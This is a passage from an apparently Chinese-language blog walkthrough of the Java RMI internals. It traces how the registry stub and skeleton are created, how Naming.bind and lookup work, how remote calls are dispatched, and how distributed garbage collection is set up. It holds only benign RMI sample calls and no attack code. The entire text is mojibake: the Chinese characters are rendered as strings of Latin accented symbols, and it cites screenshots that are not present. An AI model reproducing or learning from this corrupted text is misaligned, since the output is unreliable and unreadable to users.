é€’çš„UnicastRefå¯¹è±¡ï¼š\nè¿™é‡Œçš„ä»£ç é€»è¾‘è¿˜æ˜¯æŒºå¥½çœ‹çš„ï¼Œä¹Ÿå°±æ˜¯å¯¹RegistryImpl_Stubçš„classå¯¹è±¡è°ƒç”¨äº†newInstance()æ–¹æ³•å¹¶ä¼ é€’äº†UnicastRefä½œä¸ºå‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œçš„createStub()æ–¹æ³•ï¼ˆå³createProxy()æ–¹æ³•ï¼‰å°±æ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªRegistryImpl_Stubç±»å¹¶è¿”å›å®ƒã€‚ å›åˆ°UnicastServerRefç±»çš„exportObject()æ–¹æ³•ï¼š\nä¸åŒç‚¹åˆæ¥äº†ï¼Œè¿™é‡Œå°±ä¼šè¿›å…¥åˆ°è¿™ä¸ªifæ¡ä»¶ï¼Œå‰é¢è¿”å›çš„RegistryImpl_Stubç±»ä¼šèµ‹å€¼ç»™var5ï¼Œè€ŒRegistryImpl_Stubç±»çš„çˆ¶ç±»å°±æ˜¯RemoteStubï¼Œè‡ªç„¶ä¼šç¬¦åˆè¿™ä¸ªifæ¡ä»¶è¯­å¥çš„åˆ¤å®šï¼Œè·Ÿè¿›setSkeleton()æ–¹æ³•ï¼Œè¿™é‡Œä¼ å…¥äº†RegistryImplç±»å®ä¾‹ï¼š\nå˜é‡ä¸­ä¸å­˜åœ¨keyä¸ºRegistryImplçš„Classå¯¹è±¡ï¼Œä¼šè¿›å…¥è¿™é‡Œçš„ifæ¡ä»¶ï¼š\nç„¶åè°ƒç”¨Utilç±»çš„createSkeleton()æ–¹æ³•ï¼Œè¿˜æ˜¯å°†RegistryImplç±»å®ä¾‹ä½œä¸ºå‚æ•°ä¼ é€’ï¼š\nè¿™é‡Œçš„getRemoteClass()æ–¹æ³•å‰é¢åˆ†æè¿‡ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥å°†var1çœ‹ä½œRegistryImplç±»çš„Classå¯¹è±¡ã€‚\næ‰€ä»¥è¿™é‡Œçš„createSkeleton()æ–¹æ³•å°±æ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªRegistryImpl_Skelç±»ã€‚\nå³ç°åœ¨UnicastServerRefç±»çš„skelå˜é‡æ˜¯RegistryImpl_Skelç±»å®ä¾‹ï¼š\nsetSkeleton()æ–¹æ³•ç»“æŸã€‚\næ‰€ä»¥åœ¨æ³¨å†Œä¸­å¿ƒæ¿å—è¿™é‡Œï¼Œå®ç°äº†RegistryImpl_Stubç±»çš„RegistryImpl_Skelç±»å®ä¾‹ã€‚\nâ€”â€”â€”â€”â€”â€”\nå›åˆ°UnicastServerRefç±»çš„exportObject()æ–¹æ³•ï¼Œåç»­è¿˜æ˜¯å°è£…è¿›äº†Targetç±»ï¼š\nè¿˜æ˜¯åˆ†åˆ«è¯´ä¸€ä¸‹è¿™é‡Œçš„å‚æ•°ï¼š\nvar1ï¼šRegistryImplç±»å®ä¾‹ thisï¼šUnicastServerRefç±»å®ä¾‹ï¼ˆç±»åŒ…å«skelè¿™ä¸ªå˜é‡ï¼‰ var5ï¼šRegistryImpl_Stubç±»å®ä¾‹ this.ref.getObjID()ï¼šè¿”å›å‰é¢çš„LiveRefä¸­çš„idï¼Œå‰é¢ä¹Ÿæ˜¯æåˆ°è¿‡çš„ï¼š var3ï¼šå‰é¢ä¼ å‚æ—¶ä¼ è¿›æ¥çš„å€¼ï¼Œä¸ºtrue ç„¶åè°ƒç”¨LiveRefçš„export()æ–¹æ³•ï¼Œæµç¨‹å’Œå‰é¢å·®ä¸å¤šï¼Œç›´æ¥åˆ°Transportç±»ï¼š\nè¿™é‡Œåˆå°†ä¸€ä¸ªTargetå¯¹è±¡æ”¾è¿›äº†ObjectTableä¸­ã€‚æ‰€ä»¥ç°åœ¨æ˜¯æœ‰å˜é‡ä¸­æœ‰ä¸¤ä¸ªé”®å€¼å¯¹ï¼š\nä¸€ä¸ªRegistryImpl_Stubç±»å®ä¾‹ï¼š å¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½çœ‹åˆ°å‰é¢åˆ†æçš„RegistryImpl_Skelç±»å®ä¾‹ï¼š\nä¸€ä¸ªé»˜è®¤åˆ›å»ºçš„DGCImpl_Stubç±»å®ä¾‹ï¼š æ­£å¥½ä¸å‰é¢çš„è¿œç¨‹å¯¹è±¡åˆ›å»ºé‚£é‡Œç›¸å‘¼åº”ï¼Œå¾ˆå¥½è¯´æ˜è¿™é‡Œä¸ºä»€ä¹ˆæ˜¯ä¸¤ä¸ªï¼Œå‰é¢ä¸ºä»€ä¹ˆæ˜¯ä¸‰ä¸ªã€‚\næ³¨å†Œä¸­å¿ƒä¸è¿œç¨‹æœåŠ¡å¯¹è±¡æ³¨å†Œçš„å¤§éƒ¨åˆ†æµç¨‹ç›¸åŒï¼Œå·®å¼‚åœ¨ï¼š\nè¿œç¨‹æœåŠ¡å¯¹è±¡ä½¿ç”¨åŠ¨æ€ä»£ç†ï¼Œinvoke æ–¹æ³•æœ€ç»ˆè°ƒç”¨ UnicastRef çš„ invoke æ–¹æ³•ï¼Œæ³¨å†Œä¸­å¿ƒä½¿ç”¨ RegistryImpl_Stubï¼ŒåŒæ—¶è¿˜åˆ›å»ºäº† RegistryImpl_Skel è¿œç¨‹å¯¹è±¡é»˜è®¤éšæœºç«¯å£ï¼Œæ³¨å†Œä¸­å¿ƒé»˜è®¤æ˜¯ 1099ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å®šï¼‰ æœåŠ¡æ³¨å†Œ å¯¹åº”ä»£ç ï¼š\n1 2 Naming.bind(\u0026#34;rmi://localhost:1099/Hello\u0026#34;,remoteTest); //è¿™é‡Œçš„remoteTestå°±æ˜¯å‰é¢çš„RemoteTestç±»å®ä¾‹ è·Ÿä¸€ä¸‹è¿‡ç¨‹ï¼š\nè¿™é‡Œçš„parseURL()æ–¹æ³•å°±æ˜¯è§£æä¼ è¿›æ¥çš„urlï¼Œæ•ˆæœå¦‚å›¾ï¼š\nè·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„getRegistry()æ–¹æ³•æºç ï¼š\nå’Œæµç¨‹å­¦ä¹ é‚£é‡Œçš„å®¢æˆ·ç«¯è·å–æ³¨å†Œè¡¨å¯¹è±¡çš„ä»£ç åŸºæœ¬ç›¸åŒï¼Œç¨å¾®æ³¨æ„ä¸€ä¸‹ã€‚\nç„¶åè°ƒç”¨åˆ°äº†RegistryImpl_Stubç±»çš„bind()æ–¹æ³•ï¼ˆæ­£å¥½å¯¹åº”åˆ°æ³¨å†Œä¸­å¿ƒåˆ›å»ºï¼‰ï¼š\nthis.ref ä¸å‰é¢æ³¨å†Œä¸­å¿ƒåˆ†ææ—¶çš„RegistryImpl_Stubç±»çš„newInstance()ä¼ å…¥çš„å‚æ•°ç›¸å¯¹åº”ã€‚\næ‰€ä»¥è¿™é‡Œè°ƒç”¨UnicastRefç±»çš„newCall()æ–¹æ³•æ˜¯åˆæƒ…åˆç†çš„ï¼Œè¿™é‡Œçš„newCallæ–¹æ³•ç®€å•æ¥è¯´å°±æ˜¯è¿”å›ä¸€ä¸ªè¿æ¥å¯¹è±¡\næ‰€ä»¥è¿™é‡Œå°±æ˜¯å»ºç«‹è¿æ¥ï¼ˆæœåŠ¡ç«¯å’Œæ³¨å†Œç«¯å»ºç«‹ï¼‰ç„¶åå‘æµé‡ŒwriteObjectæ•°æ®ã€‚\nç„¶åä¼šè°ƒç”¨åˆ°UnicastRefç±»çš„invoke()æ–¹æ³•æ¥è¿›è¡Œç½‘ç»œä¼ è¾“ï¼š\né‡Œé¢ä¼šè°ƒç”¨åˆ°executeCall()æ–¹æ³•ï¼Œè€ŒexecuteCall()æ–¹æ³•ä¼šè°ƒç”¨readObject()æ–¹æ³•ååºåˆ—åŒ–æ¥ååºè¿æ¥å¯¹è±¡ï¼š\nä¸ªäººè°ƒè¯•æ—¶æ²¡åˆ°è¿™ä¸€æ­¥ï¼ˆç¨å¾®æ³¨æ„ä¸€ä¸‹ï¼‰\nè¿™é‡Œæœ‰ç½‘ç»œæ•°æ®çš„ä¼ è¾“ï¼Œå¿…ç„¶ä¼šåˆ°æ³¨å†Œä¸­å¿ƒè¿›è¡Œä»£ç è°ƒç”¨ï¼Œåç»­çš„åœ¨æ³¨å†Œä¸­å¿ƒçš„è°ƒç”¨å¯ä»¥å‚è€ƒåé¢çš„æœåŠ¡è°ƒç”¨é‚£é‡Œçš„æ³¨å†Œä¸­å¿ƒçš„è¿‡ç¨‹ã€‚\nåœ¨é‚£é‡Œååºåˆ—åŒ–ä¼ è¿‡å»çš„å€¼åæˆåŠŸç»‘å®šã€‚\næœåŠ¡å‘ç° å‰é¢å·²ç»åŸºæœ¬åˆ†æå®Œäº†æœåŠ¡ç«¯çš„ä»£ç ï¼Œå†æ¥çœ‹ä¸€çœ‹å®¢æˆ·ç«¯ã€‚\næœåŠ¡å‘ç°ï¼Œå°±æ˜¯è·å–æ³¨å†Œä¸­å¿ƒå¹¶å¯¹å…¶è¿›è¡Œæ“ä½œçš„è¿‡ç¨‹ï¼Œè¿™é‡ŒåŒ…å«Serverç«¯å’ŒClientç«¯ä¸¤ç§ã€‚\nå¯¹åº”ä»£ç ï¼š\n1 RemoteInterface o = (RemoteInterface) Naming.lookup(\u0026#34;Hello\u0026#34;); å…ˆè¿è¡ŒæœåŠ¡ç«¯ï¼Œå†æ‰“æ–­ç‚¹è°ƒè¯•å®¢æˆ·ç«¯ã€‚\nè¿›å…¥lookup()æ–¹æ³•ï¼š\nè¿™é‡Œçš„parseURL()æ–¹æ³•åŒæ ·è¿˜æ˜¯ä¸€ä¸ªè§£æçš„æ“ä½œï¼Œæœ€åæ•ˆæœå¦‚ä¸‹ï¼š\ngetRegistry()æ–¹æ³•ä¹Ÿæ˜¯åŒæ ·çš„ï¼Œèµ·ä¸€ä¸ªè·å–æ³¨å†Œè¡¨çš„æ“ä½œï¼š\næ‰€ä»¥è¿˜æ˜¯è·å–åˆ°äº†RegistryImpl_Stubç±»å¯¹è±¡ï¼Œç„¶åè°ƒç”¨äº†RegistryImpl_Stubç±»çš„lookup()æ–¹æ³•ï¼š åœ¨è¿™é‡Œè·å–åˆ°è¿æ¥åï¼Œä¼šå¯¹è¿™ä¸ªè¿æ¥åºåˆ—åŒ–ï¼š\nç„¶åé€šè¿‡UnicastRefç±»çš„invoke()æ–¹æ³•æ¥ä¼ è¾“è¿™ä¸ªvar2ï¼Œè¿˜æ˜¯èµ·ä¸€ä¸ªç½‘ç»œä¼ è¾“çš„ä½œç”¨ã€‚\nç„¶åé€šè¿‡ååºåˆ—åŒ–ï¼Œæ¥è·å–æ³¨å†Œè¿œç¨‹å¯¹è±¡æ—¶åˆ›å»ºçš„ä»£ç†ç±»ï¼š\næœ€åè¿”å›äº†è¿™ä¸ªvar20ï¼š\nä»å›¾ä¸­å¯ä»¥çœ‹å‡ºå°±æ˜¯æˆ‘ä»¬ä¹‹å‰æ„é€ çš„ä»£ç†å¯¹è±¡ã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œåœ¨è°ƒç”¨ å…¶lookup æ–¹æ³•æ—¶ï¼Œä¼šå‘ Registry ç«¯ä¼ é€’åºåˆ—åŒ–çš„nameï¼Œç„¶åå°† Registry ç«¯è¿”å›çš„ç»“æœååºåˆ—åŒ–ã€‚\næ‰€ä»¥åœ¨å®¢æˆ·ç«¯çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬è·å–åˆ°çš„oå°±æ˜¯è¿™ä¸ªä»£ç†å¯¹è±¡ï¼š\næœåŠ¡è°ƒç”¨ åœ¨å‰é¢æˆ‘ä»¬å·²ç»è·å–åˆ°äº†ä»£ç†å¯¹è±¡ã€‚ç°åœ¨å†æ¥åˆ†æä¸€ä¸‹è¿‡ç¨‹æ˜¯æ€ä¹ˆæ ·çš„ã€‚\nå®¢æˆ·ç«¯ æ—¢ç„¶å·²ç»è·å–åˆ°äº†ä»£ç†å¯¹è±¡ï¼Œå¹¶ä¸”å¯¹ä»£ç†å¯¹è±¡è°ƒç”¨äº†æ–¹æ³•ï¼Œå¯¹åº”å¦‚ä¸‹ä»£ç ï¼š\n1 System.out.println(o.sayHello()); æ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨RemoteObjectInvocationHandlerç±»çš„invoke()æ–¹æ³•ï¼š\næ­¤æ—¶çš„å‚æ•°æƒ…å†µï¼š\nè¿˜æ˜¯æŒºç¬¦åˆé¢„æœŸçš„ã€‚\næ–­ç‚¹ä¹Ÿåˆšå¥½æ–­åœ¨è¿™é‡Œï¼Œä¹Ÿç®—æ˜¯åˆšå¥½è¯´æ˜sayHello()æ–¹æ³•ä¸æ˜¯ä¸€ä¸ªObjectæ–¹æ³•ï¼š\nç„¶åè¿™é‡Œä¼šè°ƒç”¨invokeRemoteMethod()æ–¹æ³•ä½œä¸ºè¿”å›å€¼ï¼Œè·Ÿè¿›è¿™ä¸ªinvokeRemoteMethod()æ–¹æ³•ï¼š å‰é¢çš„ifè¯­å¥éƒ½æ²¡æœ‰è¿›å…¥ï¼Œè¿™é‡Œçš„refå°±æ˜¯å‰é¢åˆ›å»ºåŠ¨æ€ä»£ç†æ—¶çš„UnicastRefç±»ï¼Œæ‰€ä»¥ç°åœ¨ä¼šè°ƒç”¨UnicastRefç±»çš„invoke()æ–¹æ³•ï¼Œç®€å•è¯´ä¸€ä¸‹è¿™é‡Œä¼ é€’çš„å‚æ•°ï¼š\nproxyï¼šä¹Ÿå°±æ˜¯ä»£ç†å¯¹è±¡ methodï¼šä¹Ÿå°±æ˜¯sayHelloã€‚ argsï¼šnull getMethodHash(method)ï¼šè·å–æ–¹æ³•çš„hashï¼Ÿåºåˆ—åŒ–ä¼ è¿‡å»ï¼Ÿç»“æœå¦‚ä¸‹ï¼š è¿›å…¥UnicastRefç±»çš„invoke()æ–¹æ³•ï¼š\nç¬¬ä¸€æ¡†å†…ä»£ç å°±æ˜¯è·å–ç›¸å…³è¿æ¥çš„æ–¹æ³•ç­‰ã€‚\nç¬¬äºŒä¸ªæ¡†å†…çš„ä»£ç å°±æ˜¯è·å–è¿æ¥å¯¹è±¡ï¼Œå¯¹åº”var7ï¼Œè¿™ä¸ªè¿æ¥å¯¹è±¡ä¹Ÿæ˜¯è€æœ‹å‹äº†ã€‚\nç»§ç»­çœ‹invoke()æ–¹æ³•ä¸­çš„å…¶ä»–é‡è¦ä»£ç ï¼š\nè¿™é‡Œçš„marshalValue()æ–¹æ³•å°±æ˜¯è¿›è¡Œåºåˆ—åŒ–ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œåºåˆ—åŒ–ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºæƒ³è¦è°ƒç”¨çš„æ–¹æ³•åç­‰çš„åºåˆ—åŒ–ã€‚\nåé¢åˆè°ƒç”¨äº†executeCall()æ–¹æ³•ï¼Œè¿™ä¸ªä»£ç é€»è¾‘å’Œå‰é¢åˆ†æé‚£æ¬¡çš„å·®ä¸å¤šï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç½‘ç»œä¼ è¾“çš„æ–¹æ³•ï¼Ÿ\nç„¶ååˆè°ƒç”¨äº†unmarshalValue()æ–¹æ³•ç”¨æ¥ååºåˆ—åŒ–ï¼Œå’Œå‰é¢marshalValue()æ–¹æ³•é™„è¿‘çš„ä»£ç å¯¹æ¯”ï¼Œé‚£é‡Œçš„åºåˆ—åŒ–çš„æ“ä½œï¼Œåœ¨è¿™é‡Œåˆ™æ˜¯ååºåˆ—åŒ–çš„æ“ä½œï¼Œè·Ÿè¿›è¿™é‡Œçš„unmarshalValue()æ–¹æ³•ï¼Œæœ‰ä¸€ä¸ªååºåˆ—åŒ–æ“ä½œï¼š\næ‰€ä»¥è¿™é‡Œçš„å®¢æˆ·ç«¯æœ‰ä¸€ä¸ªååºåˆ—åŒ–æ“ä½œï¼Œè¿™é‡Œçš„ååºåˆ—åŒ–æ“ä½œåº”è¯¥å°±æ˜¯ååºåˆ—åŒ–è·å–åˆ°æœåŠ¡ç«¯è°ƒç”¨æ–¹æ³•å¾—åˆ°çš„è¿”å›å€¼ã€‚\næœ€åæ–¹æ³•ä¼šè¿”å›var13ï¼Œä¹Ÿå°±æ˜¯var47ï¼š\nçœ‹äº†ä¸€ä¸‹å‚æ•°ï¼Œç¡®å®è¿™é‡Œæœ€åè¿”å›çš„å°±æ˜¯sayHello()æ–¹æ³•çš„returnçš„å€¼ã€‚\næ³¨å†Œä¸­å¿ƒ è¿™é‡Œå°±éœ€è¦è°ƒè¯•æ³¨å†Œä¸­å¿ƒçš„ä»£ç ï¼Œæ¯æ¬¡å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡ç«¯ä¸æ³¨å†Œä¸­å¿ƒäº¤äº’çš„æ—¶å€™éƒ½ä¼šè°ƒç”¨ã€‚\nåœ¨æ³¨å†Œç«¯ï¼Œç”±sun.rmi.transport.tcp.TCPTransport#handleMessages()æ–¹æ³•æ¥å¤„ç†è¯·æ±‚ï¼Œå½“æœåŠ¡ä¼ å…¥rmiæ—¶ï¼Œå°±æ˜¯è¿›å…¥ç¬¬ä¸€ä¸ªswitch/caseè¯­å¥ï¼š\nè¿™é‡Œä¼šè°ƒç”¨serviceCall()æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ è¿›å»äº†ä¸€ä¸ªvar6å˜é‡ï¼Œè¿™é‡Œçš„var6å°±æ˜¯ä¹‹å‰è¯´è¿‡çš„ä¸€ä¸ªè¿æ¥å¯¹è±¡ã€‚\nè·Ÿè¿›è¿™ä¸ªserviceCall()æ–¹æ³•ï¼š\nä½†æ˜¯æˆ‘æ˜¯classæ–‡ä»¶ï¼Œæºç ä¸æ˜¯å¾ˆå…¨ï¼Œç®€å•è¿‡ä¸€éã€‚\nè¿™é‡Œå¯¹ObjectTableç±»è°ƒç”¨äº†getTarget()æ–¹æ³•ï¼š å³æ–¹æ¡†ä¸­çš„ä»£ç å¤§ä½“é€»è¾‘å°±æ˜¯ä»ObjectTableä¸­è·å–å°è£…çš„Targetå¯¹è±¡ã€‚\nç®­å¤´æŒ‡å‘çš„getImpl()æ–¹æ³•å°±æ˜¯è·å–å…¶ä¸­çš„å°è£…çš„RegistryImplå¯¹è±¡ã€‚\nç„¶åè·å–å…¶ä¸­å°è£…çš„UnicastServerRefå¯¹è±¡ï¼ŒUnicastServerRefæ˜¯Dispatcheræ¥å£çš„ä¸€ä¸ªå®ç°ç±»ï¼š\nç„¶åè°ƒç”¨äº†UnicastServerRefç±»çš„dispatch()æ–¹æ³•ï¼š è¿™é‡Œçš„var37å°±æ˜¯å‰é¢è°ƒç”¨getImpl()æ–¹æ³•å¾—åˆ°çš„RegistyImplç±»å®ä¾‹ï¼Œvar1å°±æ˜¯ä¼ è¿›æ¥çš„è¿æ¥å¯¹è±¡ã€‚\nç»§ç»­è·Ÿè¿›ï¼Œå¦‚ä¸‹ï¼š\nskelå°±æ˜¯å‰é¢åˆ†æè¿‡çš„RegistryImpl_Skelç±»ï¼Œæ‰€ä»¥åˆä¼šè°ƒç”¨oldDispatch()æ–¹æ³•ï¼š\nè¿™é‡Œå¯ä»¥çœ‹åˆ°åˆä¼šè°ƒç”¨RegistryImpl_Skelç±»çš„dispatch()æ–¹æ³•ï¼ˆclassæ–‡ä»¶ç®€å•åˆ†æä¸€ä¸‹ï¼‰ï¼š\né‡Œé¢æ¶‰åŠåˆ°äº†switch/caseï¼Œ\nè¿™é‡Œçš„0è¡¨ç¤ºè°ƒç”¨çš„æ˜¯bind()æ–¹æ³•ï¼š\nï¼ˆå¯¹åº”æœåŠ¡ç«¯è°ƒç”¨çš„ bind æ–¹æ³•çš„ä»£ç ï¼‰\né‡ç‚¹çš„ä¸¤ä¸ªå˜é‡ï¼š\nvar7ï¼šå³ä¼ è¿›æ¥çš„è¿æ¥å¯¹è±¡ var6ï¼šå³ä¼ è¿›æ¥çš„RegistyImplç±»å®ä¾‹ ä»£ç é€»è¾‘å°±æ¯”è¾ƒå¥½çœ‹æ‡‚äº†ã€‚\nå…ˆå¯¹è¿™ä¸ªè¿æ¥å¯¹è±¡å­—èŠ‚æµååºåˆ—åŒ–ä»¥è·å–è¿œç¨‹å¯¹è±¡å’ŒRMIæœåŠ¡åç§°ã€‚\nç„¶åé€šè¿‡è°ƒç”¨bind()æ–¹æ³•æ¥ç»‘å®šRMIæœåŠ¡ï¼Œç„¶åè·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„bind()æ–¹æ³•ï¼š æ‰€ä»¥ç°åœ¨å°±è¿›è¡Œäº†ä¸€æ¬¡ç»‘å®šæ“ä½œï¼Œå¯¹åº”å®¢æˆ·ç«¯ä»£ç è°ƒç”¨çš„bind()æ–¹æ³•ç»‘å®šã€‚\nâ€”â€”â€”â€”â€”â€”\nè¿™é‡Œcaseçš„2è¡¨ç¤ºå¤„ç†lookupæ–¹æ³•çš„è¯·æ±‚ï¼š\nä»¥æ­¤ç±»æ¨ï¼Œ1æ˜¯å¤„ç†list()æ–¹æ³•ï¼Œ3æ˜¯rebind()æ–¹æ³•ç­‰ã€‚\næœåŠ¡ç«¯ å†æ¥çœ‹ä¸€ä¸‹æœåŠ¡ç«¯æ˜¯å¦‚ä½•è°ƒç”¨çš„ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦è°ƒè¯•æœåŠ¡ç«¯ï¼Œå¯åŠ¨å®¢æˆ·ç«¯ã€‚\næ‰“æ–­ç‚¹äºUnicastServerRefçš„dispatch()æ–¹æ³•å¦‚ä¸‹ä½ç½®ï¼š ä¸Šå›¾å°±å·²ç»å¯ä»¥çœ‹å‡ºè¿™é‡Œçš„skelä¸ºnullï¼Œä¸ä¼šè°ƒç”¨oldDispatch()æ–¹æ³•ï¼Œä¹Ÿæ˜¯åˆ¤æ–­æ˜¯Registryç«¯è¿˜æ˜¯Serverç«¯çš„è¿‡ç¨‹ã€‚ç»§ç»­å¾€åé¢çœ‹ï¼š\nçœ‹è¿™é‡Œæ¶‰åŠåˆ°çš„å‡ ä¸ªå‚æ•°ï¼š å…ˆè°ƒç”¨unmarshalParameters()æ–¹æ³•ååºåˆ—åŒ–äº†å®¢æˆ·ç«¯ä¼ æ¥çš„å‚æ•°ï¼Œç„¶åè°ƒç”¨äº†invokeå®ç°äº†sayHello()æ–¹æ³•çš„æ‰§è¡Œã€‚ç„¶åå†è°ƒç”¨marshalValue()æ–¹æ³•å°†æ•°æ®ï¼ˆå³è°ƒç”¨æ–¹æ³•åè¿”å›çš„å€¼ï¼‰åºåˆ—åŒ–ã€‚\næˆåŠŸé—­ç¯ã€‚\nç®€å•è¯´æ˜ä¸€ä¸‹è¿™é‡Œçš„var42å˜é‡çš„è°ƒç”¨ï¼š è°ƒè¯•è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼Œè¿›å…¥åˆ°å¦‚ä¸‹ï¼š\næ³¨æ„çœ‹æ­¤æ—¶lçš„å˜é‡ï¼Œæ­£å¥½å’Œå‰é¢å®¢æˆ·ç«¯ä¼ å…¥çš„methodçš„hashå€¼æ˜¯ç›¸åŒçš„ã€‚\nè¿™ä¸€ä¸ªç‚¹åŸºæœ¬å¯ä»¥è¯´æ˜åœ¨UnicastServerRefçš„dispatchæ–¹æ³•ä¸­å°±æ˜¯é€šè¿‡this.hashToMethod_Mapé‡Œçš„Methodçš„hashæ¥æŸ¥æ‰¾çš„ã€‚\næ€»ç»“ RMI åº•å±‚é€šè®¯é‡‡ç”¨äº†Stubï¼ˆè¿è¡Œåœ¨å®¢æˆ·ç«¯ï¼‰å’ŒSkeletonï¼ˆè¿è¡Œåœ¨æœåŠ¡ç«¯ï¼‰æœºåˆ¶ï¼ŒRMI è°ƒç”¨è¿œç¨‹æ–¹æ³•çš„è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\nRMI å®¢æˆ·ç«¯åœ¨è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ä¼šå…ˆåˆ›å»º Stub ( sun.rmi.registry.RegistryImpl_Stub )ã€‚ Stub ä¼šå°† Remote å¯¹è±¡ä¼ é€’ç»™è¿œç¨‹å¼•ç”¨å±‚ ( java.rmi.server.RemoteRef ) å¹¶åˆ›å»º java.rmi.server.RemoteCall( è¿œç¨‹è°ƒç”¨ )å¯¹è±¡ã€‚ RemoteCall åºåˆ—åŒ– RMI æœåŠ¡åç§°ã€Remote å¯¹è±¡ã€‚ RMI å®¢æˆ·ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ä¼ è¾“ RemoteCall åºåˆ—åŒ–åçš„è¯·æ±‚ä¿¡æ¯é€šè¿‡ Socket è¿æ¥çš„æ–¹å¼ä¼ è¾“åˆ° RMI æœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ã€‚ RMIæœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚( sun.rmi.server.UnicastServerRef )æ”¶åˆ°è¯·æ±‚ä¼šè¯·æ±‚ä¼ é€’ç»™ Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )ã€‚ Skeleton è°ƒç”¨ RemoteCall ååºåˆ—åŒ– RMI å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„åºåˆ—åŒ–ã€‚ Skeleton å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼šbindã€listã€lookupã€rebindã€unbindï¼Œå¦‚æœæ˜¯ lookup åˆ™æŸ¥æ‰¾ RMI æœåŠ¡åç»‘å®šçš„æ¥å£å¯¹è±¡ï¼Œåºåˆ—åŒ–è¯¥å¯¹è±¡å¹¶é€šè¿‡ RemoteCall ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚ RMI å®¢æˆ·ç«¯ååºåˆ—åŒ–æœåŠ¡ç«¯ç»“æœï¼Œè·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚ RMI å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼ŒRMIæœåŠ¡ç«¯åå°„è°ƒç”¨RMIæœåŠ¡å®ç°ç±»çš„å¯¹åº”æ–¹æ³•å¹¶åºåˆ—åŒ–æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ RMI å®¢æˆ·ç«¯ååºåˆ—åŒ– RMI è¿œç¨‹æ–¹æ³•è°ƒç”¨ç»“æœã€‚ DGC Distributed Garbage Collectionï¼Œåˆ†å¸ƒå¼åƒåœ¾å›æ”¶ã€‚\nå½“RMIæœåŠ¡å™¨è¿”å›ä¸€ä¸ªå¯¹è±¡åˆ°å…¶å®¢æˆ·ç«¯æ—¶ï¼Œå…¶è·Ÿè¸ªè¿œç¨‹å¯¹è±¡åœ¨å®¢æˆ·æœºä¸­çš„ä½¿ç”¨ã€‚å½“å†æ²¡æœ‰æ›´å¤šçš„å¯¹å®¢æˆ·æœºä¸Šè¿œç¨‹å¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œæˆ–è€…å¦‚æœå¼•ç”¨çš„â€œç§Ÿå€Ÿâ€è¿‡æœŸå¹¶ä¸”æ²¡æœ‰æ›´æ–°ï¼ŒæœåŠ¡å™¨å°†åƒåœ¾å›æ”¶è¿œç¨‹å¯¹è±¡ã€‚å¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡ï¼Œå°±ä¼šä¼´éšç€DGCæœåŠ¡ç«¯çš„å¯åŠ¨ã€‚\nåœ¨å‰é¢æºç åˆ†ææ—¶ï¼Œå°±å‘ç°åˆ°objTableä¸­æœ‰é»˜è®¤çš„DGCImplå¯¹è±¡ï¼š å›åˆ°ObjectTableçš„putTarget()æ–¹æ³•ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š\nè¿™é‡Œçš„dgclogæ˜¯DGCImplç±»çš„é™æ€å˜é‡ï¼š\nè¿™é‡Œè°ƒç”¨äº†è¿™ä¸ªé™æ€å˜é‡ï¼Œä¼šå¯¹DGCImplç±»è¿›è¡Œç±»åˆå§‹åŒ–ï¼Œè€ŒDGCImplç±»å­˜åœ¨staticé™æ€ä»£ç å—ï¼š åŸºæœ¬å°±èƒ½è§£é‡Šæˆ‘ä¸ºä»€ä¹ˆObjectTableä¸­ä¼šé»˜è®¤æœ‰DGCImplå¯¹è±¡äº†ã€‚\nåŒæ—¶è¿˜åˆ›å»ºäº†DGCImpl_Stubä»£ç†ç±»å’ŒDGCImpl_Skelå¯¹è±¡ã€‚\nå¾ˆç†Ÿæ‚‰ï¼Œå¹¶ä¸”å…¶å®è¿™é‡Œçš„å‘½åè§„åˆ™å’Œå¤„ç†é€»è¾‘ç±»ä¼¼Registryå¯¹è±¡ã€‚\nJavaæä¾›äº†java.rmi.dgc.DGCæ¥å£ï¼Œè¿™ä¸ªæ¥å£ç»§æ‰¿äº†Remoteæ¥å£ï¼Œå®šä¹‰äº†dirtyå’Œcleanæ–¹æ³•ã€‚\nåœ¨RegistryImpl_Stub#lookup()æ–¹æ³•ä¸­ï¼Œå‰é¢æˆ‘ä»¬éƒ½æ˜¯åˆ†æåˆ°ååºåˆ—åŒ–å°±æ²¡èµ°äº†ï¼Œä½†æ˜¯è¿™é‡Œåœ¨åç»­è°ƒç”¨çš„done()æ–¹æ³•ä¸­å…¶å®è¿˜æœ‰è¿™ä¸ªDGCImplç±»çš„åˆ©ç”¨ï¼š æŒç»­è·Ÿè¿›ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä»£ç ï¼š 